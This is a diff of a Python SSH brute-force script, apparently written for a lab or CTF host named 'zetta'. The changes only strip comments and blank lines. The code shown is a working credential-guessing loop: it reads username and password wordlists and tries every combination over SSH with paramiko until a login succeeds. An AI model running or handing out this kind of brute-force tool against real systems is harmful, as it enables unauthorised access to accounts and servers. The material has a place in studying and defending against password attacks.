@@ -18,7 +18,6 @@ except AttributeError:
 print("User file:",u_file,"Password file: ",p_file,"\n")
 
 # loop through files and store lines in arrays. strip function will remove newline characters from values
-
 usrs=open(u_file,"r")
 for l in usrs:
 	u=l.strip();usr_arr.append(u)
@@ -30,7 +29,6 @@ for l in passwords:
 passwords.close()
 
 # use of ASCII art in banner if user has pyfiglet module
-
 banner=""
 try:
 	banner=pyfiglet.figlet_format("C-Cracks SSH Enumeration")
@@ -40,12 +38,9 @@ except:
 print(banner)
 
 # try every password for each username
-
 i=1;x=0;u=0
 
-# while i is 1, loop through the following code
 while i==1:
-	# the following code will be executed and -if an exception is raised- the relevant except block is executed
 	try:
 		print("User:",usr_arr[u],"\nPassword: ",pass_arr[x])
 		sh=ssh(usr_arr[u],'zetta', password=pass_arr[x],port=22)
@@ -53,20 +48,16 @@ while i==1:
 		break
 
 	except paramiko.ssh_exception.AuthenticationException:
-
 		print("Nope, no access yet...\n");time.sleep(0.3)
 		
-		# if the password just sent was the last value in password list, reset to 0 and increment user by 1
-
 		if x==len(pass_arr)-1:
 			x=0
-			# if username just sent was the last in the list
 			if u==len(usr_arr)-1:
 				break
 			u+=1
 		else:
 			x+=1
-
+			
 		continue
 	# repeat previous attempt if delivery failed -sleep is used for safe measure
 	except:
